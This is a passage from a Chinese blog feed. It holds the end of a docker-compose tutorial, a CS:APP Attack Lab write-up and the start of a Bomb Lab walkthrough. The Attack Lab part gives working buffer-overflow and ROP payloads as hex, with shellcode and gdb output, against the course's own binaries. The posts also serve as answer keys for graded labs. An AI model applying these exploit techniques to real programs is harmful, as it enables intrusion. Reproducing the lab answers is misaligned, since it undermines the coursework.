</span><br><span class="line">  <span class="attr">nginx_web:</span></span><br><span class="line">     <span class="comment">#定义主机名</span></span><br><span class="line">     <span class="attr">container_name:</span> <span class="string">nginx_container</span></span><br><span class="line">     <span class="comment">#使用的镜像</span></span><br><span class="line">     <span class="attr">image:</span> <span class="string">nginx:1.16.1</span></span><br><span class="line">     <span class="comment">#容器的映射端口</span></span><br><span class="line">     <span class="attr">ports:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="number">80</span><span class="string">:80</span></span><br><span class="line">       <span class="bullet">-</span> <span class="number">443</span><span class="string">:443</span></span><br><span class="line">     <span class="comment">#定义挂载点         </span></span><br><span class="line">     <span class="attr">volumes:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/nginx/html:/usr/share/nginx/html</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/nginx/conf/nginx.conf:/etc/nginx/nginx.conf</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/nginx/conf.d:/etc/nginx/conf.d</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/nginx/logs:/var/log/nginx</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">./compose/nginx/cert:/etc/nginx/cert</span></span><br><span class="line"></span><br><span class="line">     <span class="comment">#docker 重启后，容器自启动</span></span><br><span class="line">     <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">     <span class="attr">links:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">node</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">blog_api</span></span><br><span class="line">     <span class="attr">depends_on:</span> <span class="comment"># 依赖关系</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">node</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">       <span class="bullet">-</span> <span class="string">blog_api</span></span><br></pre></td></tr></table></figure>

<p>完成后，在<code>blogSystem</code>目录下，构建我们的应用，并运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>人生，重在折腾！</p>
<p>最后，祝大家中秋国庆快乐！😘</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>容器</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Attack Lab</title>
    <url>/2023/09/08/CS-APP-Attack-Lab/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在这个实验中，我们主要分别通过代码注入和<code>ROP</code>的方式对可执行文件执行缓冲区溢出漏洞利用。<a id="more"></a></p>
<h2 id="第一部分：代码注入"><a href="#第一部分：代码注入" class="headerlink" title="第一部分：代码注入"></a>第一部分：代码注入</h2><p>先获取汇编代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d ctarget &gt; ctarget.s</span><br></pre></td></tr></table></figure>

<p>该部分中，利用字符串攻击CTARGET，该程序的堆栈位置在每次运行时都是一致的，因此堆栈上的数据可被视为可执行代码。</p>
<h3 id="4-1"><a href="#4-1" class="headerlink" title="4-1"></a>4-1</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    val = getbuf();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"No exploit. Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>test</code>程序调用<code>getbuf</code>函数，然后需要我们输入字符串，造成缓冲区溢出，控制程序，使其进入touch1函数中，而不是回到test函数中。通过观察getbuf的汇编，我们可以发现其内部开辟了40字节的内存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:	48 83 ec 28          	sub    $0x28,%rsp</span><br><span class="line">  4017ac:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  4017af:	e8 8c 02 00 00       	call   401a40 &lt;Gets&gt;</span><br></pre></td></tr></table></figure>

<p>我们来看一下最初的栈帧情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line"></span><br><span class="line">字符串地址--&gt; +----------------+</span><br><span class="line">            |                |</span><br><span class="line">            |   0x28h字节     |</span><br><span class="line">            |                |</span><br><span class="line">            +----------------+</span><br><span class="line">            |  test返回地址   |</span><br><span class="line">            +----------------+</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>

<p>由于Gets函数调用过程中，会将输入的字符串往高地址写入，因此如果我们尝试写入多于0x28h字节后，再次输入时，会将返回地址覆盖，我们借助这个特性，控制程序的走向，把返回地址覆盖为touch1的地址即可。</p>
<p>写入文件4_1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 写入40字节的占位符  *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00 &#x2F;*  touch1 所在地址，用于覆盖返回地址,注意，地址是8个字节的 *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; 4_1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>



<h3 id="4-2"><a href="#4-2" class="headerlink" title="4-2"></a>4-2</h3><p>这一关卡，在上一个关卡的基础之上，还要求我们传入参数，而我们知道，C语言函数调用过程中，第一个参数保存在寄存器<code>rdi</code>中，因此我们要想办法在返回函数<code>touch2</code>之前修改<code>rdi</code>。</p>
<p>而修改<code>rdi</code>也很简单，只需要借助下面的指令即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov $0x59b997fa, %rdi  # 将 cookie 的值传入</span><br></pre></td></tr></table></figure>

<p>因此正确的逻辑是，通过缓冲区溢出，控制程序走到上述指令位置，执行完上述指令后，再回到<code>touch2</code>函数中，因此关键是怎么获取上述指令的位置。</p>
<p>实际上，上述指令是我们通过缓冲区溢出得到的，换句话说，我们如果能够获取<code>getbuf</code>函数中<code>buf</code>字符串首地址，那我们就可以间接获取到了上述指令的地址，我们可以借助gdb完成这个步骤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb ctarget</span><br></pre></td></tr></table></figure>

<p>然后下断点在<code>getbuf</code>函数:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">b getbuf</span><br><span class="line">run -q</span><br><span class="line">--------------------------</span><br><span class="line"> RAX  0x0</span><br><span class="line">*RBX  0x55586000 ◂— 0</span><br><span class="line"> RCX  0x0</span><br><span class="line"> RDX  0x0</span><br><span class="line">*RDI  0x5561d758 —▸ 0x7ffff7c596f0 (funlockfile) ◂— mov    rdi, qword ptr [rdi + 0x88]</span><br><span class="line">*RSI  0x4032c0 ◂— add    byte ptr [rsi + 0x6f], cl</span><br><span class="line"> R8   0x0</span><br><span class="line">*R9   0x7ffff7d71640 (__memcpy_ssse3+8672) ◂— mov    rcx, qword ptr [rsi - 0xc]</span><br><span class="line">*R10  0x7ffff7c0be40 ◂— 0xe001a00007bc4</span><br><span class="line">*R11  0x7ffff7dbb650 ◂— 0xfffb5a60fffb5898</span><br><span class="line">*R12  0x2</span><br><span class="line"> R13  0x0</span><br><span class="line"> R14  0x0</span><br><span class="line">*R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe240 ◂— 0x0</span><br><span class="line">*RBP  0x55685fe8 —▸ 0x402fa5 ◂— push   0x3a6971 /* 'hqi:' */</span><br><span class="line">*RSP  0x5561dca0 —▸ 0x401976 (test+14) ◂— mov    edx, eax</span><br><span class="line">*RIP  0x4017a8 (getbuf) ◂— sub    rsp, 0x28</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x4017a8 &lt;getbuf&gt;       sub    rsp, 0x28</span><br><span class="line">   0x4017ac &lt;getbuf+4&gt;     mov    rdi, rsp</span><br><span class="line">   0x4017af &lt;getbuf+7&gt;     call   Gets                      &lt;Gets&gt;</span><br><span class="line"> </span><br><span class="line">   0x4017b4 &lt;getbuf+12&gt;    mov    eax, 1</span><br><span class="line">   0x4017b9 &lt;getbuf+17&gt;    add    rsp, 0x28</span><br><span class="line">   0x4017bd &lt;getbuf+21&gt;    ret    </span><br><span class="line"> </span><br><span class="line">   0x4017be                nop    </span><br><span class="line">   0x4017bf                nop    </span><br><span class="line">   0x4017c0 &lt;touch1&gt;       sub    rsp, 8</span><br><span class="line">   0x4017c4 &lt;touch1+4&gt;     mov    dword ptr [rip + 0x202d0e], 1 &lt;vlevel&gt;</span><br><span class="line">   0x4017ce &lt;touch1+14&gt;    mov    edi, 0x4030c5</span><br></pre></td></tr></table></figure>

<p>通过观察控制台，我们可以知道，此时栈顶指针是<code>0x5561dca0</code>，但是<code>buf</code>的首地址是还要减去<code>0x28</code>，即<code>0x5561dc78</code>，为了方便，我们直接把修改<code>rdi</code>的指令放到该地址开始的地方即可。</p>
<p>我们先编写指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 4_2_code.s</span><br><span class="line">movq $0x59b997fa, %rdi  # 将 cookie 的值传入</span><br><span class="line">pushq $0x4017ec       # 写入 touch2 所在地址</span><br><span class="line">ret					  # 将栈顶元素作为返回地址</span><br></pre></td></tr></table></figure>

<p>然后生成对应的机器码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c 4_2_code.s</span><br><span class="line">objdump -d 4_2_code.o &gt; 4_2_code.d</span><br><span class="line">cat 4_2_code.d</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   7:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   c:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>写入文件4_2.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 fa 97 b9 59 68</span><br><span class="line">ec 17 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00  &#x2F;* 0x5561dc78,即字符串首地址 *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; 4_2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure>

<h3 id="4-3"><a href="#4-3" class="headerlink" title="4-3"></a>4-3</h3><p>本关卡要求我们调用<code>touch3</code>的时候，传入一个字符串地址，该字符串内容是我们的<code>cookie</code>的值（以字符串形式），其实关键是获取到字符串地址，<strong>同时写入到不会被覆盖的地方</strong></p>
<p>先看看涉及的两个函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">    <span class="comment">// 将 cookie 以16进制的形式转为字符串，不够8位的在左边补0</span></span><br><span class="line">    <span class="keyword">char</span> *s = cbuf + <span class="built_in">random</span>() % <span class="number">100</span>;</span><br><span class="line">    <span class="comment">// 将字符串随机写到以cbuf为首的一段地址内</span></span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">    <span class="comment">// 比较</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">        <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Touch3!: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        validate(<span class="number">3</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">        fail(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先来看一下<code>getbuf</code>栈帧情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line"></span><br><span class="line">字符串buf地址--&gt;  +----------------+</span><br><span class="line">                |                |</span><br><span class="line">                |   0x28h字节     |</span><br><span class="line">                |                |</span><br><span class="line">                +----------------+</span><br><span class="line">                |  test返回地址   |</span><br><span class="line">                +----------------+</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>

<p>如果我们尝试像上个关卡一样，把我们的<code>cookie</code>字符串写入到<code>buf</code>的首地址，等我们进入到<code>touch3</code>，再进入到<code>hexmatch</code>时候，由于会在本地开启110字节的内存，然后随机写入cookie，这个过程有可能将我们之前写入的内容覆盖，因此一开始的时候，我们要把<code>cookie</code>字符串写入到返回地址后面。即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">低地址</span><br><span class="line"></span><br><span class="line">字符串buf地址--&gt;  +----------------+</span><br><span class="line">                |                |</span><br><span class="line">                |   0x28h字节     |</span><br><span class="line">                |                |</span><br><span class="line">                +----------------+</span><br><span class="line">                |    返回地址     |</span><br><span class="line">                +----------------+</span><br><span class="line">                |  cookie字符串   |</span><br><span class="line">                +----------------+</span><br><span class="line">高地址</span><br></pre></td></tr></table></figure>

<p>cookie所在的地址为：<code>0x5561dca0+8=0x5561dca8h</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 4_3_code.s</span><br><span class="line">movq $0x5561dca8, %rdi  # 将 cookie字符串地址 传入</span><br><span class="line">pushq $0x4018fa       # 写入 touch3 所在地址</span><br><span class="line">ret					  # 将栈顶元素作为返回地址</span><br></pre></td></tr></table></figure>

<p>生成对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c 4_3_code.s</span><br><span class="line">objdump -d 4_3_code.o &gt; 4_3_code.d</span><br><span class="line">cat 4_3_code.d</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          push   $0x4018fa</span><br><span class="line">   c:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>写入文件4_3.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00  &#x2F;* 0x5561dc78,即字符串首地址 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 &#x2F;* 59b997fa 每个字符对应的ascii码 *&#x2F;</span><br></pre></td></tr></table></figure>

<p> 测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; 4_3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<h2 id="第二部分：ROP"><a href="#第二部分：ROP" class="headerlink" title="第二部分：ROP"></a>第二部分：ROP</h2><h3 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h3><p>先获取汇编代码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>

<p>这个关卡中，我们要调用<code>touch2</code>，我们需要寻找能够修改<code>rdi</code>的gadgets，最优的情况是，能够找到<code>pop rdi</code>且同时后面接上一个<code>pop</code> ，这样一来我们就可以方便控制程序走向的同时还能控制传入的参数，但是所提供的<code>rtarget.s</code>中，并不存在<code>popq rdi=0x5f</code>，我们只能退而求其之。</p>
<p>幸好我们存在<code>movq %rax,%rdi=48 89 c7</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>如果我们从<code>0x4019a2</code>这个地址开始解析，我们可以得到指令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4019a2: 48 89 c7  movq %rax,%rdi&#x3D;48 89 c7</span><br><span class="line">4019a5: c3        ret</span><br></pre></td></tr></table></figure>

<p>接着这个思想，我们要寻找能够修改<code>rax</code>的gadgets，最终的完整利用链如下（注意，我们不能修改堆栈指针<code>rsp</code>和<code>rbp</code>，因为有的时候我们要借助这些指针作为基地址）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4019cc: 58  		popq %rax</span><br><span class="line">4019cd: 90			nop</span><br><span class="line">4019ce: c3			ret</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">4019a2: 48 89 c7  	movq %rax,%rdi</span><br><span class="line">4019a5: c3			ret</span><br><span class="line">|</span><br><span class="line">v</span><br><span class="line">00000000004017ec &lt;touch2&gt;:</span><br></pre></td></tr></table></figure>

<p>写入文件5_1.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; 5_1.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h3 id="5-2"><a href="#5-2" class="headerlink" title="5-2"></a>5-2</h3><p>为了能够成功调用<code>touch3</code>，在这一部分中，我们要调用<code>touch3</code>，同时要传入一个字符串地址，而在<code>rtarget</code>中，由于采用了随机地址化策略，我们无法通过<code>gdb</code>调试方式获取。</p>
<p>然而，实际上在<code>getbuf</code>函数中，<code>buf</code>字符串地址是通过栈指针来确定的，我们可借助这个特性，先将栈顶指针获取，然后通过加减法获取实际<code>buf</code>地址即可获取我们输入的cookie字符串起始位置，因此我们可以利用缓冲区溢出漏洞，将返回地址返回到保存<code>rsp</code>，记下此时的栈顶，再通过<code>pop rax</code>的方式将我们的偏移量放到<code>rax</code>中，再经过一些调用，最终使得我们能够调用<code>add_xy(x,y)</code>函数，完成字符串偏移地址计算。</p>
<p>写入文件5_2.txt</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">&#x2F;* 由于add_xy()需要修改rdi和rsi，因此我们要想办法填入这两个参数 *&#x2F;</span><br><span class="line">06 1a 40 00 00 00 00 00 &#x2F;* movq %rsp,%rax 所在地址，rsp距离cookie字符串 8*9&#x3D;72字节 *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi 所在地址 *&#x2F; </span><br><span class="line">cc 19 40 00 00 00 00 00 &#x2F;* popq %rax 所在地址 *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* 偏移量为72字节 *&#x2F;</span><br><span class="line">dd 19 40 00 00 00 00 00 &#x2F;* movl %eax,%edx 所在地址 *&#x2F;</span><br><span class="line">69 1a 40 00 00 00 00 00 &#x2F;* movl %edx,%ecx 所在地址 *&#x2F;</span><br><span class="line">13 1a 40 00 00 00 00 00 &#x2F;* movl %ecx,%esi 所在地址 *&#x2F;</span><br><span class="line">d6 19 40 00 00 00 00 00 &#x2F;*  lea (%rdi,%rsi,1),%rax 所在地址 *&#x2F;</span><br><span class="line">c5 19 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi 所在地址 *&#x2F;</span><br><span class="line">fa 18 40 00 00 00 00 00 &#x2F;* touch3 *&#x2F;</span><br><span class="line">35 39 62 39 39 37 66 61 &#x2F;* cookie字符串对应的ASCII *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; 5_2.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3("59b997fa")</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 C5 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Bomb Lab</title>
    <url>/2023/08/05/CS-APP-Bomb-Lab/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>该实验主要是考察我们的阅读汇编代码的能力，会有几个小的关卡，通过了第一个关卡后才可以进入下一个关卡。</p>
<p>推荐工具：<code>pwbdbg</code>，便于动态调试查看源码和寄存器等变量.<a id="more"></a></p>
<p>获取汇编代码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bomb &gt; bomb.s</span><br></pre></td></tr></table></figure>

<p>通关观察<code>bomb.c</code>文件，我们可以知道，每一个阶段都会获取我们的输入，然后作为参数调用<code>phase_x</code></p>
<p>函数调用过程，参数传递表：</p>
<table>
<thead>
<tr>
<th>机器位数</th>
<th>1</th>
<th>2</th>
<th>3</th>
<th>4</th>
<th>5</th>
<th>6</th>
</tr>
</thead>
<tbody><tr>
<td>64</td>
<td>%rdi</td>
<td>%rsi</td>
<td>%rdx</td>
<td>%rcx</td>
<td>%r8</td>
<td>%r9</td>
</tr>
</tbody></table>
<p>如果参数超过7，则第七个开始，参数是放到栈上，且是逆序压入栈中（第7个参数是在栈顶）</p>
<p>返回值是放到了<code>rax</code>中</p>
<p>此外，<code>rbp</code>寄存器通常被用作栈帧指针（Frame Pointer）或基址指针（Base Pointer），一般用于定位局部变量</p>
<p>rsp用于指向当前栈顶的地址，二者动态共同维护函数栈帧</p>
<h2 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h2><p>使用pwndbg打开可执行文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">b main</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后不断单步运行，输入测试<code>aaaabbbb</code>，然后使用命令<code>s</code>步入<code>phase_1</code>方法，该函数内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">► 0x400ee0 &lt;phase_1&gt;       sub    rsp, 8</span><br><span class="line">   0x400ee4 &lt;phase_1+4&gt;     mov    esi, 0x402400</span><br><span class="line">   0x400ee9 &lt;phase_1+9&gt;     call   strings_not_equal                      &lt;strings_not_equal&gt;</span><br><span class="line"> </span><br><span class="line">   0x400eee &lt;phase_1+14&gt;    test   eax, eax</span><br><span class="line">   0x400ef0 &lt;phase_1+16&gt;    je     phase_1+23                      &lt;phase_1+23&gt;</span><br><span class="line"> </span><br><span class="line">   0x400ef2 &lt;phase_1+18&gt;    call   explode_bomb                      &lt;explode_bomb&gt;</span><br><span class="line"> </span><br><span class="line">   0x400ef7 &lt;phase_1+23&gt;    add    rsp, 8</span><br><span class="line">   0x400efb &lt;phase_1+27&gt;    ret</span><br></pre></td></tr></table></figure>

<p>我们可以看到，函数将<code>0x402400</code>作为参数，给到了<code>esi</code>，然后是调用函数<code>strings_not_equal</code>，该函数用于判断两个字符串是否相等，而<code>esi</code>是调用函数中，充当保存第二个参数的角色，盲猜<code>0x402400</code>中存放的是一个字符串，我们来看看这个字符串是什么：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> <span class="built_in">print</span> (char*)0x402400</span></span><br><span class="line"><span class="meta">$</span><span class="bash">3 = 0x402400 <span class="string">"Border relations with Canada have never been better."</span></span></span><br></pre></td></tr></table></figure>

<p>把它作为输入参数，先重新运行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bomb</span><br><span class="line">b main</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>然后输入<code>Border relations with Canada have never been better.</code>，程序果然进入到了下一个阶段函数中了。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">In file: /home/kali/Desktop/bomb/bomb.c</span><br><span class="line">   76                                 * Let me know how they did it. */</span><br><span class="line">   77     printf("Phase 1 defused. How about the next one?\n");</span><br><span class="line">   78 </span><br><span class="line">   79     /* The second phase is harder.  No one will ever figure out</span><br><span class="line">   80      * how to defuse this... */</span><br><span class="line"> ► 81     input = read_line();</span><br><span class="line">   82     phase_2(input);</span><br><span class="line">   83     phase_defused();</span><br><span class="line">   84     printf("That's number 2.  Keep going!\n");</span><br><span class="line">   85 </span><br><span class="line">   86     /* I guess this is too easy so far.  Some more complex code will</span><br></pre></td></tr></table></figure>

